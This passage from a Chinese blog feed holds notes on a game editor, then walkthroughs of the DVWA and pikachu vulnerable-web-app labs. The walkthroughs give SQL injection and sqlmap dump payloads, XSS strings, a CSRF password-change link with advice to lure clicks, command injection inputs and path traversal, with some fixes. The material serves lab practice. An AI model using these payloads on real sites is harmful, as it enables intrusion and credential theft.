        <content type="html"><![CDATA[<h1 id="星火编辑器"><a href="#星火编辑器" class="headerlink" title="星火编辑器"></a>星火编辑器</h1><h2 id="一、编辑器界面"><a href="#一、编辑器界面" class="headerlink" title="一、编辑器界面"></a>一、编辑器界面</h2><h3 id="1-部分顶端栏"><a href="#1-部分顶端栏" class="headerlink" title="1 部分顶端栏"></a>1 部分顶端栏</h3><blockquote><ol><li>文件：文件信息。</li><li>调试：本地运行游戏。</li><li>发布：上传到服务器，可以在手机上体验。</li><li>我的资源：系统自带美术资源。</li></ol></blockquote><h3 id="2-数据编辑器"><a href="#2-数据编辑器" class="headerlink" title="2 数据编辑器"></a>2 数据编辑器</h3><blockquote><p>创建对象预制件。</p></blockquote><h3 id="3-触发编辑器v2"><a href="#3-触发编辑器v2" class="headerlink" title="3 触发编辑器v2"></a>3 触发编辑器v2</h3><blockquote><p>在此处编辑触发器。服务端数据反馈，客户端主要UI交互。</p><p>事件：发生的事件。</p><p>所属场景：区域。</p><p>变量：新建云变量——设置云变量——提交云变量。</p><p>类：多个云变量。</p></blockquote><h3 id="4-预制功能库"><a href="#4-预制功能库" class="headerlink" title="4 预制功能库"></a>4 预制功能库</h3><blockquote><p>商店中自带模块，可以拖动至游戏机制中，然后点击左上角的应用。</p></blockquote><h4 id="4-1-N选1"><a href="#4-1-N选1" class="headerlink" title="4.1 N选1"></a>4.1 N选1</h4><blockquote><p>应用后，点击跳转到数据编辑器，可以编辑奖励。</p><p>先编辑BUFF——再编辑奖励（没有的话点击搜索栏左侧的齿轮添加）——最后绑定触发</p></blockquote><h4 id="4-2-局内聊天"><a href="#4-2-局内聊天" class="headerlink" title="4.2 局内聊天"></a>4.2 局内聊天</h4><blockquote><p>应用后，可做如下操作。</p><p>触发器：可以在『动作』中搜索 ”输出“，找到输出聊天信息输出信息。</p></blockquote><h3 id="5-界面编辑器"><a href="#5-界面编辑器" class="headerlink" title="5 界面编辑器"></a>5 界面编辑器</h3><blockquote><p>UI。</p></blockquote><h3 id="6-常用按键"><a href="#6-常用按键" class="headerlink" title="6 常用按键"></a>6 常用按键</h3><blockquote><p>鼠标右键：移动视角</p><p>Ctrl + 鼠标右键：转动视角</p></blockquote><hr><h2 id="二、游戏界面"><a href="#二、游戏界面" class="headerlink" title="二、游戏界面"></a>二、游戏界面</h2><h3 id="1-场景"><a href="#1-场景" class="headerlink" title="1 场景"></a>1 场景</h3><blockquote><p>创建新场景：左上角点击加号——设置属性。</p><p>属性面板：</p><ul><li>边缘与天顶：选择边缘类型，可以让地面向下延伸。</li></ul><p>地形：可以选择风格，可以选择地形类型，可以自动生成装饰物，可以增加一层或降低一层降低，可以绘制和擦除装饰。</p><p>单位：拖入创建的单位。</p><p>素材：素材。可以拖动在场景后在属性面板调节信息。</p><p>物品：</p><p>氛围：</p><p>灯光：</p><p>区域：</p></blockquote><hr><h2 id="三、场景对象"><a href="#三、场景对象" class="headerlink" title="三、场景对象"></a>三、场景对象</h2><h3 id="1-镜头"><a href="#1-镜头" class="headerlink" title="1 镜头"></a>1 镜头</h3><blockquote><p>设定新镜头：新加镜头——镜头中选择同步地图参数——保存。</p></blockquote><h3 id="2-单位"><a href="#2-单位" class="headerlink" title="2 单位"></a>2 单位</h3><blockquote><p>在数据编辑器中制作单位。</p><p>在界面中拖入单位。</p><p>属性面板：</p><ul><li>单位归属：单位所处阵营。默认1玩家2电脑0中立。</li></ul></blockquote><h3 id="3-技能"><a href="#3-技能" class="headerlink" title="3 技能"></a>3 技能</h3><blockquote><p>在数据编辑器中制作技能，然后挂载到玩家身上。</p></blockquote><h3 id="4-氛围"><a href="#4-氛围" class="headerlink" title="4 氛围"></a>4 氛围</h3><blockquote><p>环境灯光等要素。设置氛围时要给场景单独设置氛围，否则会作用于全局。</p></blockquote><h2 id="四、编程"><a href="#四、编程" class="headerlink" title="四、编程"></a>四、编程</h2><h3 id="1-触发器问题"><a href="#1-触发器问题" class="headerlink" title="1 触发器问题"></a>1 触发器问题</h3><blockquote><p>Q1：重复触发触发器</p><p>A1：在结尾处禁用触发器。</p></blockquote><h2 id="五、文件结构"><a href="#五、文件结构" class="headerlink" title="五、文件结构"></a>五、文件结构</h2><blockquote><p>场景：<code>[project]\scene</code></p><p>单位：<code>[project]\editor\table\entry_data\unit</code></p><p>图片资源：<code>[project]\ui\image</code></p></blockquote><h2 id="六、动画"><a href="#六、动画" class="headerlink" title="六、动画"></a>六、动画</h2><blockquote><p>Q1：动画不触发。</p><p>A1：可能是动画别名和动画原名设置存在问题。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> 星火编辑器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA</title>
      <link href="/posts/a922f8e1.html"/>
      <url>/posts/a922f8e1.html</url>
      
        <content type="html"><![CDATA[<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><hr><h2 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h2><h3 id="1-下载"><a href="#1-下载" class="headerlink" title="1 下载"></a>1 下载</h3><blockquote><p><a href="https://www.xp.cn/">official::phpstudy</a></p><p><a href="https://github.com/digininja/DVWA">official::DVWA</a></p></blockquote><p>DVWA的默认账号和密码：</p><div class="table-container"><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>admin</td><td>password</td></tr><tr><td>gordonb</td><td>abc123</td></tr><tr><td>1337</td><td>charley</td></tr><tr><td>pablo</td><td>letmein</td></tr><tr><td>smithy</td><td>password</td></tr></tbody></table></div><h3 id="2-配置数据库"><a href="#2-配置数据库" class="headerlink" title="2 配置数据库"></a>2 配置数据库</h3><blockquote><ol><li>复制一个<code>./config/config.inc.php.dist</code>，改名为<code>config.inc.php</code>。</li><li>打开，修改其中的数据库账号密码为对应的账号密码。</li></ol></blockquote><hr><h2 id="二、Brute-Force"><a href="#二、Brute-Force" class="headerlink" title="二、Brute Force"></a>二、Brute Force</h2><h3 id="1-Low"><a href="#1-Low" class="headerlink" title="1 Low"></a>1 Low</h3><ol><li>在网站中输入任意数据，使用burp suite进行抓包。</li><li>将数据包发给Intruder。</li><li>Positions：攻击参数选定username,password，攻击方式选择集束炸弹。</li><li>Payloads：载入字典进行攻击。</li><li>点击结果中的长度，正确的页面的长度和错误的是不一样的。找到不同的长度的界面，记下用户名和密码后到界面中进行验证。</li></ol><p>由源码得也可以直接username = <code>admin&#39; and 1=1#</code>进行登录（密码可为空）</p><h3 id="2-Medium"><a href="#2-Medium" class="headerlink" title="2 Medium"></a>2 Medium</h3><blockquote><p>对sql注入进行了过滤。直接按照Low的方式爆破即可。</p></blockquote><h3 id="3-High"><a href="#3-High" class="headerlink" title="3 High"></a>3 High</h3><ol><li>正常抓包，发现包中携带token信息。</li><li>通过重发器修改账号或密码重复，发现响应包中携带了token，猜测该响应包的token的value是下一次的token值</li><li>将包发送给Intruder，选定username，password，token。因为每次的token只用一次，所以攻击方式选择音叉。</li><li>Payloads：username和password不变。token的有效载荷类型选择递归搜索。</li><li>Positions：Payload选择3（token），在请求引擎中修改线程数为1（因为token要由上一个请求产生）。在Grep-Extract中点击添加，找到<code>&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;...&quot; /&gt;</code>，选中value中的值，点击OK。</li><li>在Positions中将刚刚的token作为Payload3的初始数据填入。</li><li>攻击，验证结果。</li></ol><h3 id="4-Impossible"><a href="#4-Impossible" class="headerlink" title="4 Impossible"></a>4 Impossible</h3><blockquote><p>通过观察源代码发现，登录3次会锁定15s，且数据库查询使用的是PDO（PHP Data Object）机制防御sql注入。</p></blockquote><hr><h2 id="三、SQL-Injecton"><a href="#三、SQL-Injecton" class="headerlink" title="三、SQL Injecton"></a>三、SQL Injecton</h2><blockquote><p>报错：<code>Illegal mix of collations for operation &#39;UNION&#39;</code></p><p>解决方案：打开phpMyAdmin，修改dvwa库的排序规则为utf8_general_ci，同时要选中更改所有表排序规则，更改所有列的排序规则。</p></blockquote><h3 id="1-Low-1"><a href="#1-Low-1" class="headerlink" title="1 Low"></a>1 Low</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>注入点</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; -- &amp;Submit=Submit</span></span><br><span class="line"><span class="string"># 不报错是字符型，报错是数字型</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2.列数</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="comment">-- &amp;Submit=Submit</span></span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>报错点</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2 -- &amp;Submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4.库名</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span> <span class="comment">-- &amp;Submit=Submit</span></span><br><span class="line"></span><br><span class="line"># <span class="number">5.</span>表名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select group_concat(table_name),2 from information_schema.tables where table_schema = database() -- &amp;Submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 6.列名</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> &quot;users&quot; <span class="comment">-- &amp;Submit=Submit</span></span><br><span class="line"></span><br><span class="line"># <span class="number">7.</span>数据</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select group_concat(user,&quot; &quot;,password),2 from users-- &amp;Submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="2-Medium-1"><a href="#2-Medium-1" class="headerlink" title="2 Medium"></a>2 Medium</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>注入点</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="comment">-- &amp;Submit=Submit</span></span><br><span class="line"># 报错是数字型</span><br><span class="line"></span><br><span class="line"># <span class="number">6.</span>列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="number">0x64767761</span> <span class="comment">-- &amp;Submit=Submit</span></span><br><span class="line"># 因为该难度有引号绕过，所以可以把表名换成十六进制进行绕过。</span><br><span class="line"></span><br><span class="line"># <span class="number">7.</span>数据</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users<span class="comment">-- &amp;Submit=Submit</span></span><br><span class="line"></span><br><span class="line"># 其他同理于Low</span><br></pre></td></tr></table></figure><h3 id="3-High-1"><a href="#3-High-1" class="headerlink" title="3 High"></a>3 High</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>注入点</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27; = &#x27;</span><span class="number">2</span></span><br><span class="line"># 判断出是字符型</span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>列数</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>#</span><br><span class="line"></span><br><span class="line"># 其他同理于Medium</span><br></pre></td></tr></table></figure><h3 id="4-Impossible-1"><a href="#4-Impossible-1" class="headerlink" title="4 Impossible"></a>4 Impossible</h3><blockquote><p>数据库查询使用的是PDO（PHP Data Object）机制防御sql注入。</p></blockquote><hr><h2 id="四、-ing-SQL-Injection-Blind"><a href="#四、-ing-SQL-Injection-Blind" class="headerlink" title="四、[ing]SQL Injection (Blind)"></a>四、[ing]SQL Injection (Blind)</h2><h3 id="1-Low-2"><a href="#1-Low-2" class="headerlink" title="1 Low"></a>1 Low</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 手动</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># sqlmap工具</span><br><span class="line"># 库</span><br><span class="line">python sqlmap <span class="operator">-</span>u &quot;http://172.22.124.198/DVWA/vulnerabilities/sqli_blind/?id=id%3D1&amp;Submit=Submit#&quot; <span class="comment">--cookie=&quot;PHPSESSID=p82hv3qkciumhcvuuhkt35qp5a; security=low&quot; --batch --dbs</span></span><br><span class="line"></span><br><span class="line"># 表</span><br><span class="line">python sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.22</span><span class="number">.124</span><span class="number">.198</span><span class="operator">/</span>DVWA<span class="operator">/</span>vulnerabilities<span class="operator">/</span>sqli_blind<span class="operator">/</span> <span class="operator">-</span>D <span class="string">&#x27;DBname&#x27;</span> <span class="comment">--tables --form --batch</span></span><br><span class="line"># 列</span><br><span class="line">python sqlmap <span class="operator">-</span>uhttp:<span class="operator">/</span><span class="operator">/</span><span class="number">172.22</span><span class="number">.124</span><span class="number">.198</span><span class="operator">/</span>DVWA<span class="operator">/</span>vulnerabilities<span class="operator">/</span>sqli_blind<span class="operator">/</span> <span class="operator">-</span>D <span class="string">&#x27;DBname&#x27;</span> <span class="operator">-</span>T <span class="string">&#x27;table&#x27;</span> <span class="comment">--columns --form --batch</span></span><br><span class="line"># 数据</span><br><span class="line">python sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.22</span><span class="number">.124</span><span class="number">.198</span><span class="operator">/</span>DVWA<span class="operator">/</span>vulnerabilities<span class="operator">/</span>sqli_blind<span class="operator">/</span> <span class="operator">-</span>D <span class="string">&#x27;DBname&#x27;</span> <span class="operator">-</span>T <span class="string">&#x27;table&#x27;</span> <span class="operator">-</span>C <span class="string">&#x27;column_1 , column_2&#x27;</span> <span class="comment">--dump --form --batch</span></span><br></pre></td></tr></table></figure><h3 id="2-Medium-2"><a href="#2-Medium-2" class="headerlink" title="2 Medium"></a>2 Medium</h3><h3 id="3-High-2"><a href="#3-High-2" class="headerlink" title="3 High"></a>3 High</h3><h3 id="4-Impossible-2"><a href="#4-Impossible-2" class="headerlink" title="4 Impossible"></a>4 Impossible</h3><hr><h2 id="五、XSS-Reflected"><a href="#五、XSS-Reflected" class="headerlink" title="五、XSS (Reflected)"></a>五、XSS (Reflected)</h2><h3 id="1-Low-3"><a href="#1-Low-3" class="headerlink" title="1 Low"></a>1 Low</h3><blockquote><p>直接用最常见的payload：<code>?name=&lt;script&gt;alert(&#39;111&#39;)&lt;/script&gt;</code></p></blockquote><h3 id="2-Medium-3"><a href="#2-Medium-3" class="headerlink" title="2 Medium"></a>2 Medium</h3><blockquote><p>输入普通payload发现script和&lt;&gt;没有了。然后输入<code>img src onerror</code>发现会有回显。</p><p>所以直接使用：<code>?name=&lt;img src=&quot;1&quot; onerror=alert(&#39;111&#39;);&gt;</code>即可。</p><p>此题也可以大小写或双写绕过。</p><p><code>&lt;sCript&gt;alert(&quot;123&quot;)&lt;/SCript&gt;</code></p><p><code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;123&quot;)&lt;/script&gt;</code></p></blockquote><h3 id="3-High-3"><a href="#3-High-3" class="headerlink" title="3 High"></a>3 High</h3><blockquote><p>此题源码中有一个scirpt的正则匹配，所以大小写和双写无效。但是图片构造一样有效。</p><p>所以也可以用：<code>?name=&lt;img src=&quot;1&quot; onerror=alert(&#39;111&#39;);&gt;</code></p></blockquote><h3 id="4-Impossible-3"><a href="#4-Impossible-3" class="headerlink" title="4 Impossible"></a>4 Impossible</h3><blockquote><p>使用了函数htmlspecialchars()对特定字符进行实体化，且内容不是插在标签内部，无法闭合标签。</p></blockquote><h2 id="六、XSS-Stored"><a href="#六、XSS-Stored" class="headerlink" title="六、XSS (Stored)"></a>六、XSS (Stored)</h2><h3 id="1-Low-4"><a href="#1-Low-4" class="headerlink" title="1 Low"></a>1 Low</h3><blockquote><p>直接输入：<code>&lt;script&gt;alert(&#39;111&#39;)&lt;/script&gt;</code>发现有长度限制，直接F12改前端代码。</p><p>最后发现Name和Message都会触发存储型XSS。</p></blockquote><h3 id="2-Medium-4"><a href="#2-Medium-4" class="headerlink" title="2 Medium"></a>2 Medium</h3><blockquote><p>先改前端长度，再输入Low的payload，发现Name和Message的<code>&lt;script&gt;</code>都不见了，并且Message还加上了反斜杠。</p><p>测试大小写和双写，成功。</p><p>测试发现Name可以注入，但是Message不行。</p></blockquote><h3 id="3-High-4"><a href="#3-High-4" class="headerlink" title="3 High"></a>3 High</h3><blockquote><p>同理反射型，用<code>&lt;img src=&quot;1&quot; onerror=alert(&#39;123&#39;);&gt;</code>即可。</p><p>测试发现Name可以注入，但是Message不行。</p></blockquote><h3 id="4-Impossible-4"><a href="#4-Impossible-4" class="headerlink" title="4 Impossible"></a>4 Impossible</h3><blockquote><p>同理反射型。</p></blockquote><h2 id="七、XSS-DOM"><a href="#七、XSS-DOM" class="headerlink" title="七、XSS (DOM)"></a>七、XSS (DOM)</h2><h3 id="1-Low-5"><a href="#1-Low-5" class="headerlink" title="1 Low"></a>1 Low</h3><blockquote><p>直接：<code>?default=&lt;script&gt;alert(&#39;123&#39;)&lt;/script&gt;</code>成功。</p></blockquote><h3 id="2-Medium-5"><a href="#2-Medium-5" class="headerlink" title="2 Medium"></a>2 Medium</h3><blockquote><p>输入<code>?default=&lt;script&gt;</code>，发现他会默认选择English，说明应该是对<code>&lt;script&gt;</code>有过滤。</p><p>输入<code>&lt;/option&gt;</code>，F12查看源码，发现可以闭合标签。所以可以把标签全部闭合，然后使用img标签报错产生漏洞。</p><p>所以payload：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=&#39;1&#39; onerror=alert(&#39;123&#39;); /&gt;</code></p></blockquote><h3 id="3-High-5"><a href="#3-High-5" class="headerlink" title="3 High"></a>3 High</h3><blockquote><p>直接输入<code>&lt;/option&gt;</code>，发现选择了English，说明&lt;&gt;很可能被过滤了。</p><p>查看源码，发现是白名单，仅限指定的字符。</p><p>所以可以用如下payload：<code>?default=# &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>绕过服务器检测。（被注释的内容不会发给服务器，但是会在前端被执行）</p></blockquote><h3 id="4-Impossible-5"><a href="#4-Impossible-5" class="headerlink" title="4 Impossible"></a>4 Impossible</h3><blockquote><p>代码在前端被编码不执行，服务器不进行处理。</p></blockquote><h2 id="八、CSRF"><a href="#八、CSRF" class="headerlink" title="八、CSRF"></a>八、CSRF</h2><h3 id="1-Low-6"><a href="#1-Low-6" class="headerlink" title="1 Low"></a>1 Low</h3><blockquote><p>任意输入密码，发现了URL中GET请求的参数。构造payload包：<code>http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</code>。之后可以再网上将其转化成短连接，然后引诱用户点击。当用户登录了该网站并点击了链接时，密码就会被改变。</p></blockquote><h3 id="2-Medium-6"><a href="#2-Medium-6" class="headerlink" title="2 Medium"></a>2 Medium</h3><p>&gt;</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-High-6"><a href="#3-High-6" class="headerlink" title="3 High"></a>3 High</h3><p>&gt;</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-Impossible-6"><a href="#4-Impossible-6" class="headerlink" title="4 Impossible"></a>4 Impossible</h3><p>&gt;</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="九、Command-Injection"><a href="#九、Command-Injection" class="headerlink" title="九、Command Injection"></a>九、Command Injection</h2><blockquote><p>问题：乱码。</p><p>解决方案：进入<code>DVWA\dvwa\includes\dvwaPage.inc.php</code>，修改所有的<code>charset=utf-8</code>为<code>charset=gb2312</code>。</p></blockquote><h3 id="1-Low-7"><a href="#1-Low-7" class="headerlink" title="1 Low"></a>1 Low</h3><blockquote><p>没有过滤，直接：<code>127.0.0.1&amp;dir</code></p></blockquote><h3 id="2-Medium-7"><a href="#2-Medium-7" class="headerlink" title="2 Medium"></a>2 Medium</h3><blockquote><p>源码发现过滤了<code>&amp;&amp;，;</code>直接：<code>127.0.0.1&amp;dir</code></p></blockquote><h3 id="3-High-7"><a href="#3-High-7" class="headerlink" title="3 High"></a>3 High</h3><blockquote><p>大部分字符会被过滤，但是<code>|</code> 没有，因为源码是<code>|</code>，在<code>|</code>后面还有个空格，所有payload中的<code>|</code>后面没有空格即可 <code>127.0.0.1|dir</code></p></blockquote><h3 id="4-Impossible-7"><a href="#4-Impossible-7" class="headerlink" title="4 Impossible"></a>4 Impossible</h3><blockquote><p>对IP严格限定了数字，无法绕过。</p></blockquote><h2 id="十、"><a href="#十、" class="headerlink" title="十、"></a>十、</h2><h3 id="1-Low-8"><a href="#1-Low-8" class="headerlink" title="1 Low"></a>1 Low</h3><p>&gt;</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-Medium-8"><a href="#2-Medium-8" class="headerlink" title="2 Medium"></a>2 Medium</h3><p>&gt;</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-High-8"><a href="#3-High-8" class="headerlink" title="3 High"></a>3 High</h3><p>&gt;</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-Impossible-8"><a href="#4-Impossible-8" class="headerlink" title="4 Impossible"></a>4 Impossible</h3><p>&gt;</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 安全实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu</title>
      <link href="/posts/f45d9698.html"/>
      <url>/posts/f45d9698.html</url>
      
        <content type="html"><![CDATA[<h1 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h1><hr><h2 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h2><h3 id="1-下载"><a href="#1-下载" class="headerlink" title="1 下载"></a>1 下载</h3><blockquote><p><a href="https://www.xp.cn/">official::phpstudy</a></p><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">official::pikachu</a></p></blockquote><h3 id="2-数据库错误"><a href="#2-数据库错误" class="headerlink" title="2 数据库错误"></a>2 数据库错误</h3><blockquote><p>问题：<code>Warning: mysqli_connect()</code></p><p>解决：</p><ol><li>在phpstudy中新增一个数据库，名字最好是pikachu。</li><li>配置<code>./inc/config.inc.php</code>文件中的数据库名、用户名、密码。</li></ol><p>问题：<code>Fatal error: Uncaught Error: Call to a member function bind_param()</code></p><p>解决：访问<code>http://127.0.0.1/pikachu/installl.php</code>，重装数据库。</p></blockquote><hr><h2 id="二、暴力破解"><a href="#二、暴力破解" class="headerlink" title="二、暴力破解"></a>二、暴力破解</h2><blockquote><p>用户信息在提示中。</p></blockquote><h3 id="1-表单"><a href="#1-表单" class="headerlink" title="1 表单"></a>1 表单</h3><ol><li>在网站中输入任意数据，使用burp suite进行抓包。</li><li>将数据包发给Intruder。</li><li>Positions：攻击参数选定username,password，攻击方式选择集束炸弹。</li><li>Payloads：载入字典进行攻击。</li><li>点击结果中的长度，正确的页面的长度和错误的是不一样的。找到不同的长度的界面，记下用户名和密码后到界面中进行验证。</li></ol><h3 id="2-验证码（on-server）"><a href="#2-验证码（on-server）" class="headerlink" title="2 验证码（on server）"></a>2 验证码（on server）</h3><blockquote><p>服务器端验证，且验证码重发表不会改变。因此只需输入一次正确的验证码，然后抓包，按表单后续爆破步骤即可。</p></blockquote><h3 id="3-验证码（on-client）"><a href="#3-验证码（on-client）" class="headerlink" title="3 验证码（on client）"></a>3 验证码（on client）</h3><blockquote><p>客户端验证，仅在客户端验证。因此可以在前端输入正确验证码，或者直接禁用JS不输入验证码。后续抓包在数据包中可以不带有验证码，然后按表单后续爆破步骤即可。</p></blockquote><h3 id="4-token"><a href="#4-token" class="headerlink" title="4 token"></a>4 token</h3><ol><li>正常抓包，发现包中携带token信息。</li><li>通过重发器修改账号或密码重复，发现响应包中出现csrf token error报错。同时会发现包中有一个标签：<code>&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;...&quot; /&gt;</code>。</li><li>将该token带入到包中重发，发现不报csrf token error错误，可以猜测每次响应包的token的value是下一次的token值。</li><li>将包发送给Intruder，选定username，password，token。因为每次的token只用一次，所以攻击方式选择音叉。</li><li>Payloads：username和password不变。token的有效载荷类型选择递归搜索。</li><li>Potions：Payload选择3（token），在请求引擎中修改线程数为1（因为token要由上一个请求产生）。在Grep-Extract中点击添加，找到<code>&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;...&quot; /&gt;</code>，选中value中的值，点击OK。</li><li>攻击，验证结果。</li></ol><h3 id="5-修复方法"><a href="#5-修复方法" class="headerlink" title="5 修复方法"></a>5 修复方法</h3><ol><li>登陆错误次数过多锁定账户或IP。</li><li>验证码在后端验证且需要刷新。</li></ol><hr><h2 id="三、Over-Permission"><a href="#三、Over-Permission" class="headerlink" title="三、Over Permission"></a>三、Over Permission</h2><h3 id="1-水平越权"><a href="#1-水平越权" class="headerlink" title="1 水平越权"></a>1 水平越权</h3><p><strong>越权方法：</strong></p><ol><li>正常登录任意一个用户。（用户信息在提示中）</li><li>点击查看个人信息后发现url变成：<code>http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</code>，修改username为其他账户名即可完成越权。</li></ol><p><strong>修复方法：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用session进行身份校验,在op1_mem.php的27行左右添加如下代码。</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$_SESSION</span>[<span class="string">&#x27;op&#x27;</span>][<span class="string">&#x27;username&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">return</span> ;&#125;</span><br></pre></td></tr></table></figure><h3 id="2-垂直越权"><a href="#2-垂直越权" class="headerlink" title="2 垂直越权"></a>2 垂直越权</h3><p><strong>越权方法：</strong></p><ol><li>登录admin</li><li>添加用户和删除刚刚添加的用户，发现添加用户的url为<code>http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php</code>，删除用户的url为<code>http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin.php?id=25</code>。多次创建删除后发现id会递增，所以下次删除的id应当是最后一个删除的id+1</li><li>登录pikachu，直接访问<code>http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php</code>，发现可以访问成功，添加一个用户。</li><li>登录admin发现用户存在，表明可以越权添加用户。</li><li>登录pikachu，直接访问<code>http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin.php?id=27</code>，再次登录admin，发现用户依旧存在，说明不能越权删除用户。</li></ol><p><strong>修复方法：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加级别验证，在op2_admin_edit.php的22行左右进行代码修改。</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">check_op2_login</span>(<span class="variable">$link</span>))</span><br><span class="line"><span class="comment">// 修改为</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">check_op2_login</span>(<span class="variable">$link</span>)  ||  <span class="variable">$_SESSION</span>[<span class="string">&#x27;op2&#x27;</span>][<span class="string">&#x27;level&#x27;</span>] != <span class="number">1</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="四、目录遍历"><a href="#四、目录遍历" class="headerlink" title="四、目录遍历"></a>四、目录遍历</h2><h3 id="1-目录遍历"><a href="#1-目录遍历" class="headerlink" title="1 目录遍历"></a>1 目录遍历</h3><p><strong>遍历方法：</strong></p><ol><li>点击<code>we&#39;re jarheads!</code>，URL变成了<code>http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=jarheads.php</code></li><li>修改URL为<code>http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../burteforce/bf_form.php</code>，发现可以跳转到其他页面。</li><li>修改URL为<code>http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../../../../../../Windows/win.ini</code>，可以获得系统文件信息。</li></ol><p><strong>修复方法：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修改dir_list.php的第20左右的代码，使用basename()函数确保只获取文件名部分，而不包含路径信息</span></span><br><span class="line"><span class="variable">$filename</span> = 